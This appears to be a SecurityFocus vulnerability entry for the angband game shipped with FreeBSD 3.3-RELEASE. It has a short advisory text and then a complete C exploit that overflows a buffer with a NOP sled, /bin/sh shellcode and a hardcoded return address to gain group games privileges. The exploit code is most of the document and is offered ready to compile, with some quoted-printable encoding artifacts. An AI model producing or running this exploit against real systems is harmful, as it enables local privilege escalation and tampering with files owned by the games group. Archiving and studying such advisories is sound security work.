source: http://www.securityfocus.com/bid/840/info

The version angband shipped with FreeBSD 3.3-RELEASE is vulnerable to a local buffer overflow attack. Since it is setgid games, a compromise of files and directories owned by group games is possible. 

/* FreeBSD 3.3 angband exploit yields egid of group games
* usage: gcc -o angames angames.c
/path/to/angband `./angames <offset>`
* overflow is 1088bytes of NOP/Shellcode + 4bytes EIP +2bytes garbage
* Brock Tellier <btellier@usa.net>
*/


#include <stdio.h>

char shell[]= /* mudge@lopht.com */
"\xeb\x35\x5e\x59\x33\xc0\x89\x46\xf5\x83\xc8\x07\x66\x89\x46\xf9"
"\x8d\x1e\x89\x5e\x0b\x33\xd2\x52\x89\x56\x07\x89\x56\x0f\x8d\x46"
"\x0b\x50\x8d\x06\x50\xb8\x7b\x56\x34\x12\x35\x40\x56\x34\x12\x51"
"\x9a>:)(:<\xe8\xc6\xff\xff\xff/bin/sh";
 =

 =

main (int argc, char *argv[] ) {
int x = 0;
int y = 0;
int offset = 0;
int bsize = 1095; /* 2bytes"-u" + overflowed buf's bytes + */
char buf[bsize]; /* 4bytesEBP + 4bytesEIP + 2bytesGarbage */
char arg[bsize + 2];
int eip = 0xbfbfc6b4; /* FreeBSD 3.3 */
 =

if (argv[1]) { =

offset = atoi(argv[1]);
eip = eip + offset;
}
fprintf(stderr, "eip=0x%x offset=%d buflen=%d\n", eip, offset, bsiz=
e);
 =

for ( x = 0; x < 1021; x++) buf[x] = 0x90;
fprintf(stderr, "NOPs to %d\n", x);
 =

for ( y = 0; y < 67 ; x++, y++) buf[x] = shell[y];
fprintf(stderr, "Shellcode to %d\n",x);
 =

buf[x++] = eip & 0x000000ff;
buf[x++] = (eip & 0x0000ff00) >> 8;
buf[x++] = (eip & 0x00ff0000) >> 16;
buf[x++] = (eip & 0xff000000) >> 24;
fprintf(stderr, "eip to %d\n",x);
buf[x++] = 'X';
buf[x++] = 'X';
fprintf(stderr, "garbage to %d\n", x);

buf[bsize - 1] = '\0';

sprintf(arg, "-u%s", buf);
arg[bsize + 1] = '\0';
 =

printf("%s", arg);
 =

}